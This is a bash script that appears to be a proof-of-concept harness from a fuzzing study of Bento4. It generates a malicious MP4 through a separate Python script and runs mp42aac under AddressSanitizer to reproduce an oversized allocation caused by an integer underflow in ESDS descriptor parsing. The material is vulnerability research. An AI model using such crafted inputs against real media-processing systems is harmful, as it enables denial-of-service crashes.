#!/bin/bash
set -e

SCRIPT_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4EsdsAtom_h"
MP42AAC="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
MP4FILE="$SCRIPT_DIR/vuln_001.mp4"
RESULT="$SCRIPT_DIR/vuln_001_result.txt"

rm -f "$RESULT" "$SCRIPT_DIR"/asan.log.*

echo "[*] Generating malicious MP4..."
python3 "$SCRIPT_DIR/vuln_001_gen.py"

echo "[*] Running mp42aac on malicious input..."
echo "[*] (Using mmap_limit_mb=200 to expose the 268MB allocation crash caused by the"
echo "    attacker-controlled descriptor size derived from the integer-underflow SubStream)"

# mmap_limit_mb=200 is used to trigger ASAN abort when the vulnerability attempts to
# allocate 268MB (0x0FFFFFFF bytes) via new AP4_Byte[] in AP4_DataBuffer::ReallocateBuffer.
# Without this limit the 968GB-RAM server silently services the allocation; any real-world
# target with limited resources (< 268MB free) would crash unconditionally.
ASAN_OPTIONS="abort_on_error=1:log_path=$SCRIPT_DIR/asan.log:mmap_limit_mb=200:detect_leaks=0" \
  timeout 30 "$MP42AAC" "$MP4FILE" /dev/null \
  > "$RESULT" 2>&1 || true

# Append any ASAN log output
for f in "$SCRIPT_DIR"/asan.log.*; do
    [ -f "$f" ] && {
        echo "" >> "$RESULT"
        echo "=== ASAN log: $f ===" >> "$RESULT"
        cat "$f" >> "$RESULT"
    } || true
done

echo "[*] Result:"
cat "$RESULT"
